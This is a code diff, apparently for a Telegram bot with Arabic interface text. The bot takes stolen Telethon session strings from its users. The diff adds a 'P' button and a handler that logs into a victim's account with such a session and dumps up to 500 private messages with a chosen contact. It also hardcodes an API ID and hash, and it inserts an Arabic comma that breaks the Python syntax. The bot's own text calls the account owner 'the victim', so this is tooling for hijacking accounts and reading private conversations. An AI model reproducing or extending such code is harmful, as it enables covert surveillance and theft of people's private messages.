@@ -125,6 +125,22 @@ async def delgroup(strses, username):
     await X(dc(username))
     
 
+async def get_user_messages(strses, username):
+    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+        try:
+            # الحصول على كيان المستخدم
+            user_entity = await X.get_entity(username)
+            messages = []
+            
+            # جلب الرسائل (يمكنك تغيير الحد حسب الحاجة)
+            async for message in X.iter_messages(user_entity.id, limit=500):
+                msg_text = message.text or "مرفق (صورة/ملف/إلخ)"
+                messages.append(f"📩 {msg_text}\n⏰ {message.date}\n\n")
+            
+            return ''.join(messages) if messages else "لا توجد رسائل مع هذا المستخدم"
+        except Exception as e:
+            return f"حدث خطأ: {str(e)}"
+
 async def cu(strses):
   try:
     async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
@@ -297,9 +313,12 @@ async def start(event):
         Button.inline("L", data="L"),
         Button.inline("M", data="M"),
         Button.inline("N", data="N"),
-        Button.inline("O", data="O"),  # الزر الجديد
-        Button.inline("X", data="X")
+        Button.inline("O", data="O")  # الزر الجديد
     ],
+    [   
+        Button.inline("P", data="P"),
+        Button.inline("X", data="X")
+    ]،
     [
         Button.url("المـطور", "https://t.me/Lx5x5")
     ]
@@ -774,6 +793,29 @@ async def users(event):
             os.remove("saved_messages.txt")
         else:
             await event.reply(f"الرسائل المحفوظة:\n\n{saved_msgs}\n\nشكراً لأستخدامك البوت", buttons=keyboard)
+
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"P")))
+async def get_user_messages_handler(event):
+    async with bot.conversation(event.chat_id) as x:
+        await x.send_message("الان ارسل الكود تيرمكس")
+        strses = await x.get_response()
+        op = await cu(strses.text)
+        if not op:
+            return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحية.", buttons=keyboard)
+        
+        await x.send_message("أرسل لي يوزر الشخص (مثال: @username)")
+        username = await x.get_response()
+        
+        await x.send_message("جاري جلب الرسائل...")
+        messages = await get_user_messages(strses.text, username.text)
+        
+        if len(messages) > 4096:  # إذا كانت الرسائل طويلة
+            with open("user_messages.txt", "w") as f:
+                f.write(messages)
+            await event.reply("الرسائل كثيرة جداً، تم حفظها في ملف", file="user_messages.txt")
+            os.remove("user_messages.txt")
+        else:
+            await event.reply(f"رسائل المستخدم:\n\n{messages}\n\nشكراً لأستخدامك البوت", buttons=keyboard)
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"X")))
 async def users(event):
